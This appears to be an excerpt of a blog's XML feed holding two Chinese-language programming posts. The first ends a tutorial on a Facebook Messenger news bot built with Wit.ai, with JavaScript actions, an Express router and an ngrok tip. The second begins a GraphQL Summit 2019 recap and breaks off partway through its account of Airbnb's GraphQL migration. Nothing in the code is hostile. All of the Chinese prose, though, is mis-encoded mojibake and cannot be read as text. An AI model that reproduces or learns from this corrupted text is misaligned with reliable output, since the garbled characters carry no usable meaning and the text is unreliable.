æ¥è‘—æˆ‘å€‘å…¶å¯¦å°±åªè¦ä¿®æ”¹å…ˆå‰çš„ quickstart.js ä»¥åŠ å…ˆå‰å¯¦ä½œéçš„ messenger API çš„éƒ¨åˆ†codeå³å¯ã€‚å› ç‚ºæˆ‘å€‘çš„ä½¿ç”¨æƒ…å¢ƒæœƒè®“ Bot åœ¨æ¥æ”¶è¨Šæ¯æ™‚ï¼Œç«‹åˆ»å…ˆå›å‚³æ–‡å­—ï¼Œæ¥è‘—æ‰æœƒå›å‚³æŸ¥è©¢çµæœï¼Œè€ŒæŸ¥è©¢çµæœå‰‡éœ€è¦åˆ©ç”¨ Messenger API å‚³é€ GenericMessage çš„çµæœï¼Œå› æ­¤æœƒéœ€è¦å…©ç¨® return Methodã€‚
const firstEntityValue = (entities, entity) =&gt; &#123;  const val = entities &amp;&amp; entities[entity] &amp;&amp;              Array.isArray(entities[entity]) &amp;&amp;              entities[entity].length &gt; 0 &amp;&amp;              entities[entity][0].value;  if (!val) &#123;    return null;  &#125;  return typeof val === &#x27;object&#x27; ? val.value : val;&#125;;// Our bot actionsconst actions = &#123;	// Wit.ai çš„ action ä¸­ï¼Œä¸€å®šè¦å¯¦ä½œçš„ send methodï¼Œç”¨ä¾†è®“æ©Ÿå™¨äººèªªè©±  send(request, response) &#123;  	const &#123;sessionId, context, entities&#125; = request;    const &#123;text, quickreplies&#125; = response;    // find out user id    const recipientId = sessions[sessionId].fbid;    if (recipientId) &#123;      // é€™é‚Šéœ€è¦åˆ¤æ–·è¦å›å‚³çš„è¨Šæ¯æ˜¯å¦ç‚ºæŸ¥è©¢çµæœ      // è‹¥ context ä¸­å¸¶æœ‰ newsResult é‚£å°±æ˜¯è¦å›å‚³æŸ¥è©¢çµæœ      // å› æ­¤å°±è¦å‘¼å« sendNewsMessagePromise() ä¾†å›å‚³ GenericMessage      if (context.newsResult) &#123;        // fbBotUtil.sendNewsMessagePromise é€™é‚Šæ˜¯ Messenger API çš„ç›¸é—œå¯¦ä½œ        return fbBotUtil.sendNewsMessagePromise(recipientId, context.newsResult)          .then(() =&gt; null)          .catch((err) =&gt; &#123;            console.error(              &#x27;Oops! An error occurred while forwarding the response to&#x27;,              recipientId,              &#x27;:&#x27;,              err.stack || err            );          &#125;);          &#125; else &#123;          // ç›´æ¥å›å‚³æ™®é€šæ–‡å­—          return fbBotUtil.sendTextMessagePromise(recipientId, text)            .then(() =&gt; null)            .catch((err) =&gt; &#123;              console.error(                &#x27;Oops! An error occurred while forwarding the response to&#x27;,                recipientId,                &#x27;:&#x27;,                err.stack || err              );            &#125;);        &#125;      &#125; else &#123;      console.error(&#x27;Oops! Couldn\&#x27;t find user for session:&#x27;, sessionId);      // Giving the wheel back to our bot      return Promise.resolve()    &#125;  &#125;,  // æˆ‘å€‘è‡ªå®šç¾©çš„ getNews action  getNews(&#123;context, entities&#125;) &#123;    return new Promise(function(resolve, reject) &#123;      var search_query = firstEntityValue(entities, &#x27;search_query&#x27;)      if (search_query) &#123;      	// é€™é‚Šæ˜¯å»å‘¼å«api      	// fetchr æ˜¯æˆ‘å¯¦ä½œçš„ä¸€å€‹å°å‡½å¼ï¼Œåˆ©ç”¨ import.io å»æŠ“ Yahoo news çš„æœå°‹çµæœã€‚      	// ä¸æ˜¯é€™ç¯‡é‡é»æˆ‘å°±å…ˆç•¥éå•¦~        fetchr(search_query, function(data) &#123;          context.newsResult = data;          console.log(&#x27;context newsResult&#x27;, context.newsResult);          delete context.missNews;        &#125;);              &#125; else &#123;        context.missNews = true;        delete context.newsResult;      &#125;      return resolve(context);    &#125;);  &#125;,&#125;;

å¯¦ä½œå®Œ Actions çš„éƒ¨åˆ†ï¼Œè¨˜å¾—åˆ° router è£¡é¢å»å¢åŠ  Wit.ai çš„ç›¸é—œ Setting
const wit = new Wit(&#123;  accessToken: &lt;Wit.ai TOKEN&gt;,  actions,&#125;);
router.post(&#x27;/&#x27;, function (req, res) &#123;  messaging_events = req.body.entry[0].messaging;  for (i = 0; i &lt; messaging_events.length; i++) &#123;    event = req.body.entry[0].messaging[i];      sender = event.sender.id;      var sessionId = findOrCreateSession(sender);      if (event.message &amp;&amp; event.message.text) &#123;        text = event.message.text;        // Handle a text message from this sender        wit.runActions(          sessionId, // the user&#x27;s current session          text, // the user&#x27;s message          sessions[sessionId].context // the user&#x27;s current session state        ).then((context) =&gt; &#123;          // Our bot did everything it has to do.          // Now it&#x27;s waiting for further messages to proceed.          console.log(&#x27;Waiting for next user messages&#x27;);          // Updating the user&#x27;s current session state          sessions[sessionId].context = context;        &#125;)        .catch((err) =&gt; &#123;          console.error(&#x27;Oops! Got an error from Wit: &#x27;, err.stack || err);        &#125;)      &#125;  &#125;  res.sendStatus(200);&#125;);
ä¸Šé¢é€™å¤§ä¸² code å…¶å¯¦å°±æ˜¯æ¥æ”¶åˆ°ä½ åœ¨ Messenger POST å‡ºå»çš„è¨Šæ¯å¾Œï¼Œå‘¼å«å®šç¾©å¥½çš„ wit.runActionsï¼Œç„¶å¾Œå°±å¯ä»¥è®“ Wit.ai å¹«ä½ åˆ†æ User çš„èªå¥ï¼Œä¸¦ä¸”å›è¦†å‡ºå»ã€‚
æœ€å¾Œé€™é‚Šæ”¾ä¸€ä¸‹é€å‡º æˆ‘é€™é‚Šç”¨åˆ°çš„ fbBotUtil.sendNewsMessagePromiseï¼Œä¹Ÿå°±æ˜¯é€å‡º messenger GenericMessage çš„ç¨‹å¼ç¢¼
Messenger GenericMessage API Usage
Final Resultå‰›å‰›æˆ‘å€‘è¨­å®šçš„èªå¥ï¼Œæ˜¯ä¸æ˜¯å°±é€é Messenger é€å‡ºä¾†äº†å‘¢ï½

One more thingæœ€å¾Œä»‹ç´¹ä¸€å€‹æ–¹ä¾¿çš„å·¥å…·ï¼Œngrokã€‚
ngrok å¯ä»¥è®“ä½ æŠŠ localhost è½‰æˆå¤–ç¶²å¯ä»¥å­˜å–çš„ç¶²å€ï¼Œä¹Ÿæ”¯æ´ httpsï¼Œå› æ­¤æˆ‘å€‘ Debug å°±æ–¹ä¾¿å¤šäº†ï¼Œä¸éœ€è¦æ¯æ¬¡éƒ½æŠŠç¨‹å¼ Deploy åˆ°é ç«¯æ©Ÿå™¨ä»¥å¾Œæ‰èƒ½æ¸¬è©¦ï¼Œlog ä¹Ÿèƒ½ç›´æ¥åœ¨æœ¬æ©Ÿç«¯çµ‚ç«¯æ©Ÿçœ‹åˆ°ï¼
ä»–çš„è¨­å®šè¶…ç°¡å–®ï¼Œåˆ° https://ngrok.com/download æŠŠç¨‹å¼ä¸‹è¼‰å›ä¾†ï¼Œä¸¦ä¸”åŸ·è¡Œ ./ngrok http PORT
æœƒå‡ºç¾å¦‚ä¸‹ç•«é¢ï¼Œé€£ https çš„ç¶²å€éƒ½æœ‰ï¼é€™æ¨£ä¸€ä¾†ï¼Œfacebookè¦æ±‚çš„ https webhook å°±ä¸æˆå•é¡Œäº†ï¼Œç•¶ç„¶å¯¦éš›ä¸Šé‹è¡Œé‚„æ˜¯è¦å»ç”¨ SSL æ†‘è­‰å•¦â€¦

åƒè€ƒè³‡æ–™

Wit.ai Doc
æ‰“é€ æˆ‘çš„èŠå¤©æ©Ÿå™¨äººï¼ç³»åˆ—äºŒï¼šWit-AI çš„èªå¥å°è©±å¯¦ä½œ

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>Messenger</tag>
        <tag>Wit.ai</tag>
        <tag>Bot</tag>
      </tags>
  </entry>
  <entry>
    <title>GraphQL Summit 2019 èˆ‡æœƒåˆ†äº«</title>
    <url>/2019/12/07/GraphQL-Summit-2019-%E8%88%87%E6%9C%83%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[å‰è¨€è¨˜å¾—å‰›ä¸Šç ”ç©¶æ‰€çš„æ™‚å€™åƒåŠ äº†ç¬¬ä¸€å±†çš„ WebConfï¼Œæ²’è¨˜éŒ¯çš„è©±æ˜¯ WebConf Taiwan 2013ã€‚ç•¶æ™‚å…©å¤©çš„è­°ç¨‹ä¸‹ä¾†ï¼Œæ¥æ”¶åˆ°çš„çŸ¥è­˜èˆ‡è¡æ“Šè®“æˆ‘ç²¾ç–²åŠ›ç›¡ï¼Œä½†å¿ƒä¸­æ˜¯æ»¿æº¢çš„å¯Œè¶³æ„Ÿï¼Œè‡ªæ­¤ä¹‹å¾Œï¼Œåªè¦æœ‰æ©Ÿæœƒæˆ‘å°±æœƒå»åƒåŠ å„ç¨® Conferenceã€‚
ç„¶è€Œæˆ–è¨±éš¨è‘—ç¶“é©—å¢é•·ï¼Œå¹³å¸¸ç²å–çŸ¥è­˜çš„ç®¡é“è®Šå¤šï¼Œèƒ½å¾æ¼”è¬›è€…çš„æ¼”èªªå…§å®¹å¸å–åˆ°çš„æ–°çŸ¥è¶Šä¾†è¶Šå°‘ï¼Œå°æ–¼åƒèˆ‡æœƒè­°è®Šå¾—èˆˆè‡´ç¼ºç¼ºï¼Œç›´åˆ°æˆ‘ç†è§£åˆ°åœ¨æœƒè­°ç¾å ´èˆ‡äººäº’å‹•äº¤æµå…¶å¯¦æ‰æ˜¯ Conference çš„ä¸€å€‹ä¸»è¦åŠŸèƒ½å¾Œï¼Œæˆ‘æ‰åˆå†åº¦ç‡ƒèµ·å‹•åŠ›ã€‚
å‰›å¥½ç›®å‰æ‰€å¾…çš„å…¬å¸ï¼Œå°æ–¼è£œåŠ©å“¡å·¥å‰å¾€åœ‹å¤–åƒèˆ‡æœƒè­°éå¸¸å¤§æ–¹ï¼Œå¾åŠ å…¥å¾Œæˆ‘å°±ä¸€ç›´æœå°‹æœ‰ä»€éº¼æƒ³åƒèˆ‡çš„æœƒè­°ï¼Œä½†ç±¤é‹ä¸€å‘ä¸å¥½çš„æˆ‘ï¼Œæœä¸å…¶ç„¶æ²’æŠ½åˆ°è¾¦åœ¨ Las Vegas çš„ React Conf 2019; ä»Šå¹´çš„ Chrome Dev Summit ä¹Ÿæ²’è¢«é¸ä¸­; æ›´éŒ¯é React Finland è·Ÿ React Rally çš„æœ€å¾Œå¹¾å¼µç¥¨ã€‚
ç„¶è€Œåœ¨æ¥è¿‘å¹´å°¾çš„åæœˆåº•ï¼ŒTeam ä¸ŠåŒäº‹å¤§åŠ›æ¨è–¦ GraphQL Summitï¼Œå‰›å¥½ç•¶æ™‚æ‰‹ä¸Šæœ‰å€‹å°ˆæ¡ˆä½¿ç”¨ Apollo ä½œç‚ºä¸»è¦æ¡†æ¶ï¼Œå°æ–¼ GraphQL è™•æ–¼ç†Ÿæ‚‰èˆ‡ä¸ç†Ÿæ‚‰ä¹‹é–“ï¼Œ æŠ±æŒè‘—ã€ä»¥é€™ç¨®ç‹€æ…‹å»åƒåŠ æœƒè­°ï¼Œæˆ–è¨±å°±èƒ½å†æ¬¡é«”é©—åˆ°ç•¶å¹´åƒèˆ‡ WebConf çš„é‚£ç¨®æ–°çŸ¥è¡æ“Šã€çš„æƒ³æ³•ï¼Œå°±ä¸€èµ·å»äº†ï¼Œä¹Ÿçš„ç¢ºæ”¶ç©«ä¸å°‘ã€‚
å›ä¾†åˆ°ç¾åœ¨å…¶å¯¦éäº†ä¸€å€‹å¤šæœˆï¼Œè¶è‘—é‚„æ²’æœ‰å®Œå…¨å¿˜å…‰ï¼Œè¶•å¿«è¨˜éŒ„ä¸‹ä¾†èˆ‡å¤§å®¶åˆ†äº«ï¼ŒåŒ…å«æˆ‘æœ‰è½çš„è­°ç¨‹ï¼Œä»¥åŠæœƒè­°æœŸé–“çš„ä¸€äº›è¦‹èã€‚
GraphQL SummitGraphQL Summit æ˜¯ç›®å‰å°ˆé–€ä»¥ GraphQL ç‚ºä¸»é¡Œçš„æœ€å¤§æœƒè­°ï¼Œå¾ 2015 å¹´ GraphQL é–‹æºå¾Œï¼Œé€£çºŒèˆ‰è¾¦äº† GraphQL Summit 2016ã€2017ã€2018 èˆ‡ 2019ï¼Œä¸»è¦ç”± Apollo æ‰€ä¸»è¾¦ï¼Œå¾€å¹´ Facebookã€Twitterã€GitHub ç­‰å¤§å…¬å¸ä¹Ÿéƒ½æœ‰è´ŠåŠ©æˆ–æ¼”è¬›ï¼Œä»Šå¹´çš„è´ŠåŠ©å•†åæ°£ä¸å¦‚ä»¥å¾€ï¼ˆæˆ‘æœ¬ä¾†å¿ƒå¿ƒå¿µå¿µæƒ³æœåˆ® GitHub è²¼ç´™â€¦ï¼‰ï¼Œå ´åœ°å»å‡ç´šä¸å°‘ï¼Œèˆ‰è¾¦åœ¨èˆŠé‡‘å±±çš„å‡±æ‚…é£¯åº—ã€‚

ä»Šå¹´çš„æœƒè­°åˆ†ç‚ºä¸‰è»Œï¼Œé™¤äº†ä¸€èˆ¬è­°ç¨‹å¤–ï¼Œä¸­é–“ä¹Ÿæœ‰ä¸€è»Œæœƒç©¿æ’ Lighting talksï¼Œä¸»é¡Œæ©«è·¨å‰ç«¯èˆ‡å¾Œç«¯åœ¨ GraphQL ä¸Šçš„æ‡‰ç”¨ã€Best practiceã€å·¥å…·èˆ‡å¯¦æˆ°ï¼ˆè¸©é›·ï¼‰ç¶“é©—åˆ†äº«ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œä¸­åˆæ™‚é–“åœ¨é¤å»³å€åŸŸä¹Ÿæœ‰ç•«åˆ†å‡ºå„ç¨®ä¸»é¡Œçš„ topic tableï¼Œæœ‰ Apollo çš„å“¡å·¥ä½œç‚ºä¸»æŒäººï¼Œå¼•å°å¤§å®¶é‡å°è©²æ¡Œçš„ä¸»é¡Œé€²è¡Œè¨è«–ï¼Œé‚Šåƒåˆé¤é‚Šé€²è¡ŒæŠ€è¡“è¨è«–çš„æ°›åœå¾ˆä¸éŒ¯ã€‚
è‡³æ–¼è­°ç¨‹éƒ¨åˆ†ï¼Œå…¶å¯¦å¤§å¤šæ˜¯èšç„¦åœ¨ Server ç«¯çš„ä¸»é¡Œï¼Œæ¯”ä¾‹ä¸Šä¾†èªªå‰ç«¯è­°ç¨‹åå°‘ï¼Œè€Œæˆ‘ä¸»è¦é‚„æ˜¯æŒ‘é¸èˆ‡å‰ç«¯ç›¸é—œçš„è­°ç¨‹åƒèˆ‡ï¼Œä»¥åŠä¸€äº› Apollo æ¨å»£è‡ªå®¶æ¡†æ¶çš„ Talksã€‚
æ¥ä¸‹ä¾†æˆ‘æœƒå¾æˆ‘æœ‰è½çš„è­°ç¨‹ä¸­ï¼Œæ“·å–æˆ‘è¦ºå¾—æ¯”è¼ƒæœ‰è¶£çš„æ¼”è¬›ï¼Œåšäº›ç°¡å–®åœ°æ•´ç†ä»‹ç´¹ï¼Œä¸¦é™„ä¸Šæˆ‘æœ‰æ”¶é›†åˆ°çš„è¬›è€…æŠ•å½±ç‰‡èˆ‡å½±ç‰‡é€£çµï¼Œå¦‚æœçœ‹å®Œè¦ºå¾—æœ‰èˆˆè¶£ï¼Œå¯ä»¥åˆ°å®˜æ–¹çš„ Youtube ç¶²ç«™ä¸Šè§€çœ‹å®Œæ•´æ¼”è¬›ï¼Œç›®å‰ GraphQL Summit 2019 çš„å½±ç‰‡éƒ½å·²å…¨æ•¸ä¸Šæ¶ï¼
åœ¨é€²å…¥è­°ç¨‹å…§å®¹å‰â€¦å…ˆè·Ÿå¤§å®¶åˆ†äº«ä¸€äº›æœƒè­°ä¸­çš„å°è¶£äº‹å……å……ç‰ˆé¢ :p
é€™å¼µç…§ç‰‡æ˜¯ç¬¬ä¸€å¤©æ—©ä¸Šæ’éšŠè¨»å†Šæ™‚æ‹ä¸‹çš„ï¼Œå¯ä»¥çœ‹åˆ°ä¸»è¾¦æ–¹ç”¨ Last Name ä½œç‚ºåˆ†æµçš„ä¾æ“šï¼Œä½†äººæ½®å¾ˆæ˜é¡¯é‚„æ˜¯é›†ä¸­åœ¨ä¸€æ’ä¸Šï¼Œç•¢ç«Ÿï¼Œå³ä½¿æœ‰ä¾†è‡ªä¸–ç•Œå„åœ°çš„èˆ‡æœƒè€…ï¼Œå§“æ°è¦èƒ½å‡å‹»åˆ†å¸ƒåœ¨å„ç¨®å­—æ¯ä¸Šçš„æ©Ÿç‡é‚„æ˜¯ä¸é«˜å•Šã€‚é›–ç„¶ç…§ç‰‡ä¸­æ’éšŠäººæ•¸é‚„ä¸å¤šï¼Œä½†æˆ‘åœ¨é‚£é‚Šè§€å¯Ÿäº†ä¸€æ®µæ™‚é–“ï¼Œä¸å°‘å¤–åœ‹äººä¹Ÿéƒ½ç™¼ç¾é€™å€‹ç¾è±¡ï¼Œè­°è«–ç´›ç´› XD

å¦å¤–ä¸€å€‹æˆ‘è¦ºå¾—è«åå…¶å¦™ä½†å¥½æ„Ÿåº¦å¾ˆé«˜çš„æ˜¯ puppy booth ğŸ¶

å®Œå…¨ä¸çŸ¥é“ç‚ºä»€éº¼è¦å¼„ä¸€å€‹å°åœæ¬„ç„¶å¾Œå¤§å®¶å¯ä»¥é€²å»ç©ç‹—ç‹— XD çœŸçš„å¾ˆç™‚ç™’å°±æ˜¯äº†ã€‚

æœƒè­°æœŸé–“æ°é€¢è¬è–ç¯€ï¼Œç¬¬ä¸€å¤©è­°ç¨‹çµæŸå¾Œçš„æ™šé¤é †ä¾¿è¾¦äº† apolloween partyï¼Œè«‹äº†å€‹ DJ ä¾†æ”¾éŸ³æ¨‚ï¼Œæœ‰äº›æœƒçœ¾ä¹Ÿè‡ªå¸¶æœè£ä¾†æ›¿æ›ï¼Œå¯æƒœå·¥ç¨‹å¸«å°±æ˜¯å·¥ç¨‹å¸«ï¼Œæœ€å—¨çš„ç¸½æ˜¯ä¸»è¾¦æ–¹è‡ªå·± XD
é€™ç¨®æœƒå¾Œ party å°±æ˜¯å–é…’å°¬èŠçš„å ´åˆï¼Œæ¯”è¼ƒæœ‰å°è±¡çš„æ˜¯é‡åˆ°ä¸€å€‹åœ¨ CodeSandbox å·¥ä½œçš„å¤§å“¥ï¼Œéš¨èº«æ”œå¸¶å…¬å¸çš„ stickersï¼Œå¤§æ¦‚æ˜¯äº¤æœ‹å‹çš„åˆ©å™¨ï¼Œç•¶ç„¶æˆ‘ä¹Ÿæ‹¿äº†ä¸å°‘ï¼›èº«ç‚º CodeSandbox ä½¿ç”¨è€…ï¼Œè·Ÿä»–æäº†ä¸å°‘éœ€æ±‚ï¼Œä¸€èµ·æŠ±æ€¨ TypeScript èŠäº†ä¸å°‘ï¼Œæ•´é«”é‚„ç®—æœ‰è¶£ã€‚
é–’è©±èªªåˆ°é€™é‚Šï¼Œä¾†é€²å…¥æ­£é¡Œã€‚
KeynotesOpening Keynote - Apollo Co-Founder &amp; CTOè² è²¬ Kicks off GraphQL Summit çš„æ˜¯ Apollo çš„ Co-Founder å…¼ CTO, Matt Debergalisã€‚åŸºæœ¬ä¸Šå°±æ˜¯ä¾†ä»‹ç´¹ä»–å€‘å®¶ç”¢å“ï¼Œä¸¦å¸¶å‡ºå¾ŒçºŒè­°ç¨‹çš„å¤§ç•¥æ–¹å‘ã€‚
é€™å ´ Keynote ä¸­ï¼Œä»–é‡è¿°äº† GraphQL åœ¨æ•´é«”å°ˆæ¡ˆæ¶æ§‹ä¸­æ‰€èƒ½å¸¶ä¾†çš„å¥½è™•ï¼Œå°‡ä»¥å¾€å¾Œç«¯èˆ‡å‰ç«¯ M to N çš„æºé€šæ¨¡å¼ï¼Œæ”¹ç‚ºä¸­é–“çµ±ä¸€ä»¥ä¸€å±¤ Data Graph é›†ä¸­è³‡æ–™ä¸¦æ˜ å°„åˆ°ä¸åŒå‰å¾Œç«¯çš„æ–°æ¶æ§‹ï¼Œè€Œ GraphQL å°±æ˜¯å¯¦ä½œè©² Data Graph çš„æœ€å¥½é¸æ“‡ã€‚åŒ…å« NY Timesã€Paypal ç­‰å…¬å¸éƒ½æŠ•å…¥å¤§é‡è³‡æºåœ¨ GraphQL ä¸Šï¼ŒPaypal å…§éƒ¨æœ‰äº”åå¤šå€‹ç”¢å“éƒ½æ˜¯æ¡ç”¨ GraphQL æŠ€è¡“ä½œç‚ºå‰å¾Œç«¯è³‡æ–™æºé€šçš„åª’ä»‹ã€‚

æ­¤å¤–ï¼Œä»–ä¹Ÿæ¨è–¦å¤§å®¶å»é–±è®€ä»–å€‘æ‰€ç·¨å¯«çš„ Principled GraphQLï¼Œæ ¹æ“šä¸Šç™¾é–“å…¬å¸å°å…¥ GraphQL çš„ç¶“é©—ç¸½çµå‡ºä¸€å¥—æº–å‰‡ï¼Œä¸¦åˆ†é¡ç‚ºä¸‰å¤§å¡Šä¾†æ¢è¨ï¼šIntegrity_ã€_Agility èˆ‡ _Operations_ã€‚Integrity èšç„¦åœ¨ One Graph çš„æ¦‚å¿µï¼Œæ¯å€‹ Team æ‡‰è©²å…±äº«ä¸€å€‹çµ±ä¸€çš„ Graphï¼Œä½†å¯¦ä½œä¸Šé‚„æ˜¯æ¯å€‹ Team å„è‡ªè² è²¬ã€‚Agility å‰‡æ˜¯æé†’å¤§å®¶ï¼Œè¦èƒ½å¤ æ¡ç”¨æ•æ·é–‹ç™¼çš„æº–å‰‡ä¾†å¯¦ä½œï¼ŒGraph çš„ Schema è¦èƒ½å¤ æ ¹æ“šå¯¦éš›éœ€æ±‚çš„è®ŠåŒ–ä¾†å¢é•·æˆ–æ”¹è®Šã€‚Operations è‘—é‡åœ¨å¦‚ä½•å°‡ Graph å®‰å…¨åœ°éƒ¨ç½²åˆ°ä½ çš„ç·šä¸Šç’°å¢ƒï¼ŒåŒ…å«å¦‚ä½• Logging èˆ‡ Separate concernsã€‚
Apollo æ¨å‡ºçš„ Federation èˆ‡ Graph Manager å°±æ˜¯å¹«å¿™å¯¦ç¾é€™äº›æº–å‰‡çš„å·¥å…·ã€‚ä»Šå¹´ä¹Ÿæœ‰å€‹è­°ç¨‹åœ¨ä»‹ç´¹ Federation Architectureã€‚
å‰ç«¯éƒ¨åˆ†ï¼Œä»–ä»‹ç´¹ Apolloã€React Hooks èˆ‡ TypeScript ä¹‹é–“æ˜¯å¦‚ä½•å®Œç¾åŒ¹é…ï¼Œæ­é… codegenï¼Œè‡ªå‹•ä¾æ“š GraphQL Query ç”¢ç”Ÿå°æ‡‰çš„ Type Interfaceï¼Œå†äº¤ç”± VS Code ç­‰ç·¨è¼¯å™¨ä¾†å•Ÿç”¨ Auto Complete ç­‰åŠŸèƒ½ã€‚
æ¥è‘—ä»¥ Search ç‚ºä¾‹ï¼Œå¼•å‡º Apollo Client 3.0 åœ¨è™•ç†å‰ç«¯ Cacheï¼ˆComponentsã€Local Stateã€Network transportï¼‰ ä¸Šæ‰€æå‡ºçš„ Unified Cache Modelï¼Œè®“ Apollo Client å¹«ä½ è™•ç†å¸¸è¦‹ Pattern çš„ Cache å•é¡Œï¼Œä¸¦æä¾›ç°¡æ˜“çš„ API è®“ä½ åœ¨åƒ Search é€™é¡éœ€è¦ä¸åŒ Cache ç­–ç•¥çš„åŠŸèƒ½ä¸Šæ–¹ä¾¿èª¿é©ã€‚
Keynote çš„ç¸½çµæ˜¯ï¼ŒGraphQL is mature and approachable

Migrating to GraphQL at Airbnb (Brie Bunge, Software Engineer at Airbnb)é€™å ´ä¹Ÿç®—æ˜¯ Keynoteï¼Œæ˜¯æˆ‘å…©å¤©è­°ç¨‹ä¸‹ä¾†ç¬¬äºŒå–œæ­¡çš„ä¸€å ´ Talkï¼ˆç¬¬ä¸€å–œæ­¡çš„ç­‰ç­‰å°±æœƒä»‹ç´¹åˆ°ï¼‰ï¼Œæ¨è–¦å¤§å®¶åˆ° Youtube ä¸Šè§€çœ‹ï¼Œä¹Ÿå°± 20 åˆ†é˜å·¦å³ã€‚ç”±ä»»è·æ–¼ Airbnb çš„ Brie Bunge åˆ†äº«ä»–å€‘å…§éƒ¨å¦‚ä½•å¾ react&#x2F;redux&#x2F;rest api çš„æ¶æ§‹è½‰ç§»åˆ° react&#x2F;apollo&#x2F;typescript çš„éç¨‹ã€‚
å»å¹´çš„ GraphQL Summit ä»–å€‘å°±å·²ç¶“åˆ†äº«é GraphQL å¦‚ä½•å¤§å¹…æå‡ä»–å€‘çš„é–‹ç™¼æ•ˆç‡ï¼Œè€Œä¸€å¹´ä¾†ä»–å€‘å°‡ GraphQL ç§»æ¤åˆ°è¶Šä¾†è¶Šå¤šçš„ team å…§ï¼Œåƒæ˜¯ PWA ç‰ˆæœ¬çš„ Mobile Webã€‚
åœ¨ Migration çš„ç­–ç•¥ä¸Šï¼ŒAirbnb æ¡ç”¨ Incremental adoptionï¼Œä»–å€‘å°‡æ•´å€‹ Migration çš„éç¨‹åˆ†ç‚ºäº”å€‹éšæ®µï¼Œæ¯å€‹éšæ®µçš„ç›®æ¨™éƒ½æ˜¯è¦èƒ½ç”¢ç”Ÿä¸€å€‹ shippable ä¸” fully funcational çš„ç”¢å“ã€‚
åœ¨åŸ·è¡Œ Incremental adoption å‰ï¼Œæœ‰äº› pre-requisites ä»–å€‘éœ€è¦å…ˆæ»¿è¶³ï¼š1. åœ¨å¾Œç«¯ä½¿ç”¨ GraphQLï¼ˆå¯ä»¥çœ‹ä»–å€‘çš„ Medium æ–‡ç« ï¼‰ï¼›2. æ¡ç”¨ TypeScriptï¼Œåˆ©ç”¨ codegen å¾ GraphQL Schema ç”¢ç”Ÿèˆ‡ Query å°æ‡‰çš„ Type Interfaceï¼Œä¿æŒå‰å¾Œç«¯çš„ Single source of truthã€‚TypeScript ä¹Ÿæˆäº† Airbnb å…§éƒ¨çš„å®˜æ–¹å‰ç«¯èªè¨€ï¼ˆå¯ä»¥çœ‹åŒå€‹è¬›è€…åœ¨ JSConf çš„æ¼”è¬›ï¼‰ã€‚
Incremental adoption åˆ†ç‚ºäº”å€‹éšæ®µï¼š

Rest -&gt; GraphQL
é€™å€‹éšæ®µçš„ç›®æ¨™æ˜¯è¦ç¢ºä¿å‰å¾Œç«¯çš„æ•´åˆæ˜¯æ²’å•é¡Œçš„ï¼Œä¹Ÿå°±æ˜¯å¾—ç¢ºä¿ GraphQL Schema èˆ‡åŸå…ˆ Rest API æä¾›çš„è³‡æ–™èƒ½å¤  Matchï¼Œåšæ³•ä¸Šå‰ç«¯å¯èƒ½å¾—åœ¨ Query å‰å¯¦ä½œä¸€äº› Adapter ä¾†ä¿®æ”¹ request params èˆ‡ response dataã€‚
å¦å¤–ä¹Ÿå¿…é ˆè¦èƒ½å¤ ä¾æ“š Schema ç”¢ç”Ÿ Typescript Typeã€‚å…‰æ˜¯ HomeCheckoutFlow é€™å€‹ feature å°±èƒ½ç”¢ç”Ÿè¶…éä¸€åƒè¡Œçš„ auto-generated TypeScript Typesã€‚
åœ¨é€™å€‹éšæ®µä»–å€‘ä¸æ›´æ–° React Componentï¼Œä¹Ÿä¸ä¿®æ”¹ API Response Shapeï¼Œå› æ­¤å¯èƒ½æœƒæœ‰ Over-fetching çš„å•é¡Œï¼Œä½†è‡³å°‘å®Œæˆæ­¤éšæ®µæ™‚ï¼Œä»–å€‘é‚„æ˜¯ä¿æœ‰ Shippable çš„ç”¢å“ã€‚


Propagate Types
ç¬¬äºŒéšæ®µç›®çš„åœ¨æ–¼åŠ å¼· TypeScript Typesï¼Œä¾†æé«˜å¾ŒçºŒéšæ®µçš„å¯¦ä½œä¿¡å¿ƒã€‚åœ¨æ­¤éšæ®µä¸ç¢°è§¸ä»»ä½• Runtime behavior èˆ‡ç”¢å“è¡Œç‚ºã€‚
åˆ©ç”¨ Generated types ä¾†å–ä»£ä»»ä½•ç¨‹å¼ç¢¼å…§çš„ any Typesã€‚
æœ‰äº†å®Œæ•´çš„ Types å¾Œï¼Œå¸¸å¸¸æœƒéœ€è¦é€²è¡Œ deep properties checkï¼Œåƒæ˜¯ data &amp;&amp; data.reservations &amp;&amp; data.reservations[0]ã€‚ä»–å€‘åˆ©ç”¨ IDX é€™å€‹å¥—ä»¶ä¾†ä½œç‚º optional chaining å‡ºç¾å‰çš„æš«è§£ã€‚


Apollo HOC -&gt; Hooks
HOC èˆ‡ Hooks ç¾åœ¨æ˜¯å…±å­˜åœ¨ code base ä¸­ï¼Œä½†ç©æ¥µçš„å¾ HOC ç§»æ¤åˆ° Hooks ä¸Šã€‚ï¼ˆuseQuery, useMutationï¼‰
å¾ Redux Store ç§»æ¤åˆ° Apollo Cacheï¼Œä½†åœ¨æ­¤éšæ®µä»–å€‘é‚„æœªæŠŠ Redux Store å®Œå…¨æ‹¿æ‰ï¼Œå› ç‚ºæœ‰äº›è³‡è¨Šä¸¦æ²’æœ‰å­˜åˆ° Apollo Cache ä¸­ï¼Œä½†å…¶æ‰®æ¼”çš„è§’è‰²å·²ç¶“ä¸é‚£éº¼é‡è¦äº†ã€‚


Granular Query Fragements
åœ¨é€™å€‹éšæ®µï¼ŒAirbnb çš„ Migration å°šæœ‰ Over-fetching å•é¡Œè¦è§£æ±ºã€‚ä»¥ä¸‹åœ–ç‚ºä¾‹ï¼Œä»–å€‘å¾ Component Tree çš„æœ€ä¸‹å±¤é–‹å§‹ï¼Œä¹Ÿå°±æ˜¯æœ€å…ˆé–‹å§‹ render çš„ Component é–‹å§‹æ¡ç”¨ Query Fragementsï¼Œè®“æ¯å€‹ Container è‡ªå·±æ±ºå®šè¦æ‹‰å–å“ªäº›è³‡æ–™ï¼Œä¸¦å…±äº« Fragementsï¼Œé€æ­¥è§£æ±º Over-fetching issueã€‚


State Management
